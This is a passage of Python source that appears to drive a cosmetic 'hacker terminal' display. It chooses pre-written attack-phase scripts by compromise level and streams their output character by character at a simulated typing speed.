    (0, 15): RECON_SCRIPTS,
    (15, 35): ENUM_SCRIPTS,
    (35, 55): ACCESS_SCRIPTS,
    (55, 75): PRIVESC_SCRIPTS,
    (75, 90): PERSIST_SCRIPTS,
    (90, 101): CONTROL_SCRIPTS,
}

def get_phase_scripts(compromise_percent: float) -> List:
    """Get scripts for current attack phase."""
    for (low, high), scripts in PHASE_SCRIPTS.items():
        if low <= compromise_percent < high:
            return scripts
    return CONTROL_SCRIPTS


async def generate_attack_script(domain_id: str, compromise_level: float) -> AsyncGenerator[str, None]:
    """
    Generate attack terminal output from pre-written scripts.
    No GPU required - fast and reliable.
    """
    sector = SECTORS.get(domain_id, SECTORS["financial"])
    scripts = get_phase_scripts(compromise_level)
    
    # Pick a random script and random target
    script_func = random.choice(scripts)
    target = random.choice(sector["targets"])
    ip = f"{sector['ip_base']}.{random.randint(10, 250)}"
    
    # Generate the script output
    output = script_func(sector, target, ip)
    
    # Stream it character by character with realistic typing speed
    for char in output:
        yield char
        # Variable typing speed for realism
        if char == '\n':
            await asyncio.sleep(random.uniform(0.05, 0.15))  # Pause at newlines
        elif char in '[]>$#':
            await asyncio.sleep(random.uniform(0.02, 0.05))  # Slower on special chars
        else:
            await asyncio.sleep(random.uniform(0.005, 0.02))  # Fast typing

